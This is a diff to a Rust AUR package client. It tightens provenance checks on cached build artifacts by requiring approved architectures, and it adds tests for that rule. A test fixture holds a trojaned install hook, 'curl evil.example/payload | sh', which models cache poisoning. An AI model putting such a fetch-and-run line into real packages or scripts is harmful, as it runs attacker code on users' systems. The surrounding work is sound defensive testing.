@@ -2503,7 +2503,7 @@ impl AurClient {
     }
 
     /// Accept a complete, ordered set of cached outputs only when every
-    /// archive's identity, version, package base, and install hook match the
+    /// archive's identity, version, package base, architecture, and install hook match the
     /// checkout. A matching cache key alone is not proof: both the key and
     /// archives live in a user-writable directory.
     fn select_cached_artifacts(
@@ -2524,6 +2524,14 @@ impl AurClient {
             return None;
         }
         Some(archives)
+    }
+
+    fn archive_architecture_approved(srcinfo: &str, architecture: &str) -> bool {
+        (architecture == "any" || architecture == std::env::consts::ARCH)
+            && srcinfo
+                .lines()
+                .filter_map(|line| line.split_once('='))
+                .any(|(key, value)| key.trim() == "arch" && value.trim() == architecture)
     }
 
     fn authorize_archives(
@@ -2567,13 +2575,8 @@ impl AurClient {
                     .architecture
                     .as_deref()
                     .context("Archive lacks architecture")?;
-                let allowed_arch = srcinfo
-                    .lines()
-                    .filter_map(|line| line.split_once('='))
-                    .any(|(key, value)| key.trim() == "arch" && value.trim() == architecture);
                 anyhow::ensure!(
-                    allowed_arch
-                        && (architecture == "any" || architecture == std::env::consts::ARCH),
+                    Self::archive_architecture_approved(srcinfo, architecture),
                     "AUR archive architecture is not approved for this host"
                 );
                 let declared = Self::srcinfo_install_script(srcinfo, output);
@@ -2662,6 +2665,17 @@ impl AurClient {
                 identity.version,
                 identity.base,
                 expected_version
+            );
+            return false;
+        }
+
+        if !identity
+            .architecture
+            .as_deref()
+            .is_some_and(|architecture| Self::archive_architecture_approved(&srcinfo, architecture))
+        {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: architecture missing or not approved for this host; rejecting cache hit"
             );
             return false;
         }
@@ -5558,10 +5572,10 @@ mod tests {
 
     // ── SEC-R2-01: cached-artifact provenance ────────────────────────────
 
-    /// Build a minimal `.pkg.tar.gz` fixture carrying `.PKGINFO` and an
-    /// optional `.INSTALL` member, like a makepkg product or a trojaned
-    /// cache-poisoning artifact.
+    /// Build an architecture-independent fixture so provenance tests exercise
+    /// the selected identity/hook defect rather than missing architecture.
     fn write_pkg_archive(path: &Path, pkginfo: &str, install: Option<&str>) {
+        let pkginfo = format!("arch = any\n{pkginfo}");
         let mut entries = vec![(".PKGINFO", pkginfo.as_bytes())];
         if let Some(install) = install {
             entries.push((".INSTALL", install.as_bytes()));
@@ -5578,6 +5592,10 @@ mod tests {
     ) -> PathBuf {
         let pkg_dir = dir.join("mypkg");
         std::fs::create_dir(&pkg_dir).expect("pkg dir");
+        let (base, rest) = srcinfo
+            .split_once('\n')
+            .expect("fixture starts with pkgbase");
+        let srcinfo = format!("{base}\narch = any\n{rest}");
         std::fs::write(pkg_dir.join(".SRCINFO"), srcinfo).expect("srcinfo");
         if let Some((name, content)) = install_file {
             std::fs::write(pkg_dir.join(name), content).expect("install script");
@@ -5587,6 +5605,67 @@ mod tests {
 
     const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
     const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";
+
+    #[test]
+    fn cached_architecture_eligibility_matches_sealed_authorization() -> Result<()> {
+        let dir = tempfile::tempdir()?;
+        let root = dir.path().canonicalize()?;
+        let pkg_dir = root.join("fixture");
+        std::fs::create_dir(&pkg_dir)?;
+        std::fs::write(
+            pkg_dir.join("PKGBUILD"),
+            b"pkgname=fixture\npkgver=1.0\npkgrel=1\n",
+        )?;
+        let archive = root.join("fixture.pkg.tar.gz");
+        let host = std::env::consts::ARCH;
+        for (declared, actual, expected) in [
+            ("any", None, false),
+            ("any", Some("any"), true),
+            (host, Some(host), true),
+            ("foreign-architecture", Some("foreign-architecture"), false),
+            ("any", Some(host), false),
+            (host, Some("any"), false),
+        ] {
+            std::fs::write(
+                pkg_dir.join(".SRCINFO"),
+                format!(
+                    "pkgbase = fixture\npkgver = 1.0\npkgrel = 1\narch = {declared}\npkgname = fixture\n"
+                ),
+            )?;
+            let mut pkginfo = "pkgname = fixture\npkgver = 1.0-1\npkgbase = fixture\n".to_string();
+            if let Some(architecture) = actual {
+                use std::fmt::Write;
+                writeln!(pkginfo, "arch = {architecture}")?;
+            }
+            write_tar_gz(&archive, &[(".PKGINFO", pkginfo.as_bytes())]);
+            let outputs = ["fixture".to_string()];
+            let cached = AurClient::select_cached_artifacts(
+                vec![archive.clone()],
+                &outputs,
+                &pkg_dir,
+                "fixture",
+            )
+            .is_some();
+            let reviewed = ReviewedSource::capture(&pkg_dir)?;
+            let authorized = AurClient::authorize_archives(
+                std::slice::from_ref(&archive),
+                &reviewed,
+                "fixture",
+                &outputs,
+                false,
+            );
+            assert_eq!(
+                authorized.is_ok(),
+                expected,
+                "final check: {declared:?} / {actual:?}: {authorized:?}"
+            );
+            assert_eq!(
+                cached, expected,
+                "cache eligibility: {declared:?} / {actual:?}"
+            );
+        }
+        Ok(())
+    }
 
     #[test]
     fn select_cached_artifact_rejects_mismatched_install_hook() {
@@ -5664,6 +5743,7 @@ mod tests {
         std::fs::create_dir_all(cache_path.parent().unwrap()).unwrap();
         std::fs::write(cache_path, "matching-key").unwrap();
         let write_split_archive = |path: &Path, pkginfo: &str| {
+            let pkginfo = format!("arch = any\n{pkginfo}");
             let encoder = zstd::Encoder::new(std::fs::File::create(path).unwrap(), 0).unwrap();
             let mut archive = tar::Builder::new(encoder);
             let mut header = tar::Header::new_gnu();
